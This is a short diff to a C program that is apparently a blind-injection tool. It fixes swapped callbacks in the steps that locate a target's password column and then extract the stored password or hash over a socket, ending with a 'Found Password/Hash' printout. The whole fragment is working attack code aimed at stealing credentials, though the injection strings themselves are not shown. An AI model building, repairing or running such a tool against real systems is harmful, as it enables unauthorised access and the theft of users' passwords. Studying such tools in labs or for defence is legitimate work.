@@ -481,7 +481,7 @@ int32_t main() {
     // 3. Find Password Column
     char pwd_name[31] = {0};
     {
-        ColumnCtx pwd_ctx = {
+        ColumnCtx pwd_col_ctx = {
             .gen_ctx = {
                 .sockfd = sockfd,
                 .discovered = pwd_name
@@ -490,7 +490,7 @@ int32_t main() {
             .col_to_find = "pwd"
         };
 
-        binary_search(check_password, &pwd_ctx);
+        binary_search(check_column, &pwd_col_ctx);
     }
 
     // 4. Find Actual Password Data
@@ -505,7 +505,7 @@ int32_t main() {
             .id_col = id_name,
             .pwd_col = pwd_name
         };
-        binary_search(check_column, &pwd_ctx);
+        binary_search(check_password, &pwd_ctx);
     }
 
     printf("Found Password/Hash: %s\n", final_password);
